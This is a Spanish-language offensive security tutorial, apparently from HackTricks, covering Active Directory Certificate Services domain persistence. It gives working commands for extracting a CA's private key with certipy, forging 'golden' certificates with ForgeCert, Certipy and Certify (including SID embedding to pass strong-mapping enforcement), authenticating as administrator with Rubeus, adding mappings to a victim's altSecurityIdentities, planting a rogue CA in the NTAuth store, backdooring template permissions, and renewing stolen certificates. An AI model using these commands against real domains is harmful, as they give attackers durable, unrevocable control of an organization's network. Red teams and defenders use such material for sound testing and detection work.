# Persistencia de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Esto es un resumen de las técnicas de persistencia de dominio compartidas en [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Revísalo para más detalles.

## Falsificación de certificados con certificados de CA robados (Golden Certificate) - DPERSIST1

¿Cómo puedes saber que un certificado es un certificado de CA?

Se puede determinar que un certificado es de CA si se cumplen varias condiciones:

- El certificado está almacenado en el servidor CA, con su clave privada asegurada por el DPAPI de la máquina, o por hardware como un TPM/HSM si el sistema operativo lo soporta.
- Tanto los campos Issuer como Subject del certificado coinciden con el nombre distinguido (distinguished name) de la CA.
- Una extensión "CA Version" está presente exclusivamente en los certificados de CA.
- El certificado carece de campos Extended Key Usage (EKU).

Para extraer la clave privada de este certificado, la herramienta `certsrv.msc` en el servidor CA es el método soportado a través de la GUI incorporada. No obstante, este certificado no difiere de otros almacenados en el sistema; por lo tanto, se pueden aplicar métodos como [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para su extracción.

El certificado y la clave privada también pueden obtenerse usando Certipy con el siguiente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Una vez obtenido el certificado CA y su clave privada en formato `.pfx`, se pueden utilizar herramientas como [ForgeCert](https://github.com/GhostPack/ForgeCert) para generar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> El usuario objetivo de la falsificación de certificados debe estar activo y ser capaz de autenticarse en Active Directory para que el proceso tenga éxito. Falsificar un certificado para cuentas especiales como krbtgt no es efectivo.

Este certificado falsificado será **válido** hasta la fecha de fin especificada y mientras el certificado raíz de la CA sea válido (habitualmente entre 5 y **10+ años**). También es válido para **máquinas**, por lo que combinado con **S4U2Self**, un atacante puede **mantener persistencia en cualquier máquina del dominio** mientras el certificado de la CA siga siendo válido.\
Además, los **certificados generados** con este método **no pueden ser revocados** ya que la CA no tiene conocimiento de ellos.

### Operando bajo Strong Certificate Mapping Enforcement (2025+)

Desde el 11 de febrero de 2025 (tras el despliegue de KB5014754), los controladores de dominio tienen por defecto **Full Enforcement** para los mapeos de certificados. Prácticamente, esto significa que tus certificados falsificados deben o bien:

- Contener una vinculación fuerte con la cuenta objetivo (por ejemplo, la SID security extension), o
- Estar emparejado con un mapeo fuerte y explícito en el atributo `altSecurityIdentities` del objeto objetivo.

Un enfoque fiable para la persistencia es emitir un certificado falsificado encadenado a la Enterprise CA robada y luego añadir un mapeo fuerte y explícito al principal de la víctima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Si puedes crear certificados forjados que incluyan la extensión de seguridad SID, estos se mapearán implícitamente incluso bajo Full Enforcement. De lo contrario, prefiere mapeos explícitos y fuertes. Consulta [account-persistence](account-persistence.md) para más información sobre mapeos explícitos.
- La revocación no ayuda a los defensores aquí: los certificados forjados son desconocidos para la base de datos de la CA y, por tanto, no pueden ser revocados.

#### Forjado compatible con Full-Enforcement (compatibilidad con SID)

Herramientas actualizadas permiten incrustar el SID directamente, manteniendo los golden certificates utilizables incluso cuando los DCs rechazan weak mappings:
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
Al incrustar el SID evitas tener que modificar `altSecurityIdentities`, que puede ser monitoreado, a la vez que sigues cumpliendo las comprobaciones estrictas de mapeo.

## Confiar en certificados CA maliciosos - DPERSIST2

El objeto `NTAuthCertificates` está definido para contener uno o más **certificados CA** dentro de su atributo `cacertificate`, que utiliza Active Directory (AD). El proceso de verificación por parte del **controlador de dominio** consiste en comprobar el objeto `NTAuthCertificates` en busca de una entrada que coincida con la **CA especificada** en el campo Issuer del **certificado** que se está autenticando. La autenticación continúa si se encuentra una coincidencia.

Un certificado CA autofirmado puede añadirse al objeto `NTAuthCertificates` por un atacante, siempre que tenga control sobre este objeto de AD. Normalmente, solo los miembros del grupo **Enterprise Admin**, junto con **Domain Admins** o **Administrators** en el **dominio raíz del bosque**, tienen permiso para modificar este objeto. Pueden editar el objeto `NTAuthCertificates` usando `certutil.exe` con el comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, o empleando la [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionales útiles para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Esta capacidad es especialmente relevante cuando se utiliza junto con un método descrito previamente que emplea ForgeCert para generar certificados dinámicamente.

> Consideraciones de mapeo post-2025: añadir una CA maliciosa en NTAuth solo establece confianza en la CA emisora. Para usar certificados leaf para logon cuando los DCs están en **Full Enforcement**, el certificado leaf debe contener la extensión de seguridad SID o debe existir un mapeo explícito fuerte en el objeto objetivo (por ejemplo, Issuer+Serial en `altSecurityIdentities`). Véase {{#ref}}account-persistence.md{{#endref}}.

## Malicious Misconfiguration - DPERSIST3

Las oportunidades para **persistencia** mediante **modificaciones del security descriptor de componentes de AD CS** son abundantes. Las modificaciones descritas en la sección "[Domain Escalation](domain-escalation.md)" pueden ser implementadas de forma maliciosa por un atacante con acceso elevado. Esto incluye la adición de "control rights" (por ejemplo, WriteOwner/WriteDACL/etc.) a componentes sensibles como:

- El **objeto Computer de AD** del servidor CA
- El **servidor RPC/DCOM del servidor CA**
- Cualquier **objeto o contenedor descendiente de AD** en **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por ejemplo, el contenedor Certificate Templates, el contenedor Certification Authorities, el objeto NTAuthCertificates, etc.)
- **Grupos de AD con derechos delegados para controlar AD CS** por defecto o por la organización (como el grupo integrado Cert Publishers y cualquiera de sus miembros)

Un ejemplo de implementación maliciosa implicaría que un atacante con **permisos elevados** en el dominio añada el permiso **`WriteOwner`** a la plantilla de certificado por defecto **`User`**, siendo el atacante el principal para ese derecho. Para explotar esto, el atacante primero cambiaría la propiedad de la plantilla **`User`** a sí mismo. A continuación, se establecería **`mspki-certificate-name-flag`** a **1** en la plantilla para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitiendo que un usuario proporcione un Subject Alternative Name en la solicitud. Posteriormente, el atacante podría **solicitar** usando la **plantilla**, eligiendo un nombre de **domain administrator** como nombre alternativo, y utilizar el certificado obtenido para autenticarse como DA.

Controles prácticos que los atacantes pueden configurar para persistencia a largo plazo en el dominio (ver {{#ref}}domain-escalation.md{{#endref}} para detalles completos y detección):

- Flags de la política de CA que permiten SAN desde los solicitantes (por ejemplo, habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Esto mantiene explotables rutas similares a ESC1.
- DACL o configuraciones de la plantilla que permitan emisión con capacidad de autenticación (por ejemplo, añadir Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar el objeto `NTAuthCertificates` o los contenedores de CA para reintroducir continuamente emisores maliciosos si los defensores intentan limpiar.

> [!TIP]
> En entornos hardened después de KB5014754, emparejar estas malas configuraciones con mapeos explícitos fuertes (`altSecurityIdentities`) asegura que los certificados emitidos o forjados sigan siendo utilizables incluso cuando los DCs aplican mapeo fuerte.

### Certificate renewal abuse (ESC14) para persistencia

Si comprometes un certificado con capacidad de autenticación (o uno de Enrollment Agent), puedes **renovarlo indefinidamente** siempre que la plantilla emisora siga publicada y tu CA siga confiando en la cadena emisora. La renovación mantiene los enlaces de identidad originales pero extiende la validez, haciendo difícil la expulsión a menos que se arregle la plantilla o se vuelva a publicar la CA.
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
Si los controladores de dominio están en **Full Enforcement**, añade `-sid <victim SID>` (o usa una plantilla que todavía incluya la extensión de seguridad SID) para que el certificado leaf renovado continúe mapeando fuertemente sin tocar `altSecurityIdentities`. Los atacantes con derechos de administrador de CA también pueden ajustar `policy\RenewalValidityPeriodUnits` para alargar la vigencia renovada antes de emitirse un certificado para sí mismos.

## Referencias

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
